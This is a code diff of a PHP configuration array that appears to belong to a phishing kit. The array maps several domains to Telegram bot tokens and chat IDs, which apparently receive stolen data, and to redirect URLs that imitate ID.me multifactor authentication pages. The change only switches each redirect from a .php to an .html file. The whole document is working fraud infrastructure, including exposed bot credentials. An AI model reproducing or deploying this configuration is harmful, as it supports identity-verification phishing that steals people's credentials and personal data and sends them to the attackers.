@@ -12,7 +12,7 @@ $site_map = [
             ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
             ['token' => '7775401700:AAFsyHpfgM9kNryQozLz8Mjmp5lDeaG0D44', 'chat_id' => '7510889526']
         ],
-        'redirect' => 'https://upstartloan.rf.gd/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php'
+        'redirect' => 'https://upstartloan.rf.gd/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html'
     ],
 
 'illuminatigroup.world' => [
@@ -20,7 +20,7 @@ $site_map = [
             ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
             ['token' => '8459891488:AAHBwkSpyaRAtGCI6yWm_-39c61LJhQgI4w', 'chat_id' => '5978851707'],
         ],
-        "redirect" => "https://illuminatigroup.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php"
+        "redirect" => "https://illuminatigroup.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
     ],
 
     'illuminatiglobal.world' => [
@@ -28,7 +28,7 @@ $site_map = [
             ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
             ['token' => '8572613269:AAEMx8dbCNQnUHfKtZ5kuhpVfjE6fBdhofw', 'chat_id' => '6512010552'],
         ],
-        "redirect" => "https://illuminatiglobal.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php"
+        "redirect" => "https://illuminatiglobal.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
     ],
 
     'illuminatinetwork.world' => [
@@ -36,7 +36,7 @@ $site_map = [
             ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
             ['token' => '8233162319:AAGUMse4WldCYNsGerfsU2FDnmY-_Heo-yM', 'chat_id' => '6944000447'],
         ],
-        "redirect" => "https://illuminatinetwork.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php"
+        "redirect" => "https://illuminatinetwork.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
     ],
 
     'illuminaticonnect.world' => [
@@ -44,7 +44,7 @@ $site_map = [
             ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
             ['token' => '8578491453:AAFjqP9TdTwv4IpsCJdghljt28y0yHqnYD8', 'chat_id' => '1972703470'],
         ],
-        "redirect" => "https://illuminaticonnect.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php"
+        "redirect" => "https://illuminaticonnect.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
     ],
 
 
